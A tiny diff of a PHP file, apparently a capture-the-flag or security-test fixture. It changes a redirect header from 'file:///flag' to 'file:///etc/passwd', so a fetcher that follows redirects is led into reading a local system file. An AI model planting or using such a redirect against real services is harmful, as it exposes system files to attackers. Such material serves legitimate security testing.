@@ -1,5 +1,5 @@
 <?php
 
-header("Location: file:///flag");
+header("Location: file:///etc/passwd");
 
 ?>
